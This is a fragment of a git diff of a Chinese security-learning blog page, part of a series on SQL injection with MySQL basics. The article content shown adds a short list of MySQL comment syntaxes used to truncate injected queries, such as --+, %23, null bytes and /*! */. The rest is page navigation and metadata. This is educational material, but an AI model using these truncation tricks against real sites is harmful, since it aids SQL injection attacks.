+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142657.png" alt></p>
+<h3 id="0x05-注释"><a href="#0x05-注释" class="headerlink" title="0x05 注释"></a>0x05 注释</h3><p><strong>行间注释：</strong></p>
+<ul>
+<li><strong><code>--+</code></strong>（–之后一个空格）</li>
+<li><strong><code>#</code></strong>（浏览器访问时需要编码成%23，否则被当作锚点起始）</li>
+<li><code>；%00</code>(空字节)</li>
+<li><em>`</em>(反引号)</li>
+</ul>
+<p><strong>行内注释：</strong></p>
+<ul>
+<li><strong><code>/*注释*/</code></strong></li>
+<li>Mysql中，<code>/*! SQL 语句 */</code> 这种格式里面的 SQL 语句会当正常的语句一样被解析。</li>
+</ul>
 
       
     </div>
@@ -478,12 +549,12 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/">0x00-SQL注入系列之MySQL基础知识</a></p>
+        <p><span>本文标题:</span><a href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/">Chapter 1：SQL注入系列之MySQL基础知识</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">sh4douu</a></p>
         <p><span>发布时间:</span>2019-03-12, 10:14:38</p>
-        <p><span>最后更新:</span>2019-03-12, 16:30:00</p>
+        <p><span>最后更新:</span>2019-03-18, 15:06:33</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/" title="0x00-SQL注入系列之MySQL基础知识">https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/</a>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/" title="Chapter 1：SQL注入系列之MySQL基础知识">https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/</a>
             <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -495,6 +566,12 @@
 
 
     <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/">
+                    记一次面试某安全公司一道XXE漏洞CTF面试题
+                </a>
+            </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
@@ -511,7 +588,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、MySQLi常用函数"><span class="toc-number">1.</span> <span class="toc-text">一、MySQLi常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-系统函数"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 系统函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-字符串拼接函数"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 字符串拼接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-字符-数字函数"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 字符/数字函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-字符串切片函数"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 字符串切片函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-读文件"><span class="toc-number">1.5.</span> <span class="toc-text">0x02 读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-写（导入）文件"><span class="toc-number">1.6.</span> <span class="toc-text">0x03 写（导入）文件</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、MySQLi常用函数"><span class="toc-number">1.</span> <span class="toc-text">一、MySQLi常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-系统函数"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 系统函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-字符串拼接函数"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 字符串拼接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-字符-数字函数"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 字符/数字函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-字符串切片函数"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 字符串切片函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-盲注相关函数"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 盲注相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-读文件-Load-file"><span class="toc-number">1.6.</span> <span class="toc-text">0x05 读文件 Load_file()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-写（导入）文件"><span class="toc-number">1.7.</span> <span class="toc-text">0x03 写（导入）文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Union-Select"><span class="toc-number">1.8.</span> <span class="toc-text">0x04 Union Select</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-注释"><span class="toc-number">1.9.</span> <span class="toc-text">0x05 注释</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -547,7 +624,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"0x00-SQL注入系列之MySQL基础知识　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Chapter 1：SQL注入系列之MySQL基础知识　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -567,7 +644,9 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/" title="上一篇: 记一次面试某安全公司一道XXE漏洞CTF面试题">
+                <i class="fa fa-angle-left"></i>
+            </a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
@@ -579,7 +658,7 @@
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/">0x00-SQL注入系列之MySQL基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/11/0x02-XSS学习系列之练习靶场01/">Chapter 3：XSS学习系列之prompt(1) XSS挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/11/0x01-XSS学习系列之漏洞原理/">Chapter 2：XSS学习系列之漏洞原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/0x00-XSS学习系列之解析HTML文档/">Chapter 1：XSS学习系列之浏览器解析HTML文档</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/05/文件上传漏洞/">文件上传漏洞（File Upload）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/04/xxe-tool/">XXE漏洞利用工具及其资源</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/XXE/">XXE（XML External Entity）漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/28/xml/">XML基本知识学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/28/文件与目录权限/">文件与目录权限</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/26/hack-zico/">Vulnhub靶机渗透笔记——Zico2</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/25/phpcms9-6-1/">PHPCMSv9.6.1任意文件下载漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/GitNote/">Git基本命令及使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/干货杂项收集/">干货杂项收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/21/build-blog/">博客搭建记录 Node.js + Hexo + Yelee + Git Pages</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/01python基础学习系列之字符串/">01python基础学习系列之字符串</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/00python基础学习系列之动态类型/">Chapter 1：Python基础学习系列之动态类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/">记一次面试某安全公司一道XXE漏洞CTF面试题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/">Chapter 1：SQL注入系列之MySQL基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/11/0x02-XSS学习系列之练习靶场01/">Chapter 3：XSS学习系列之prompt(1) XSS挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/11/0x01-XSS学习系列之漏洞原理/">Chapter 2：XSS学习系列之漏洞原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/0x00-XSS学习系列之解析HTML文档/">Chapter 1：XSS学习系列之浏览器解析HTML文档</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/05/文件上传漏洞/">文件上传漏洞（File Upload）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/04/xxe-tool/">XXE漏洞利用工具及其资源</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/XXE/">XXE（XML External Entity）漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/28/xml/">XML基本知识学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/28/文件与目录权限/">文件与目录权限</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/26/hack-zico/">Vulnhub靶机渗透笔记——Zico2</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/25/phpcms9-6-1/">PHPCMSv9.6.1任意文件下载漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/GitNote/">Git基本命令及使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/干货杂项收集/">干货杂项收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/21/build-blog/">博客搭建记录 Node.js + Hexo + Yelee + Git Pages</a></li></ul>
 
 
 
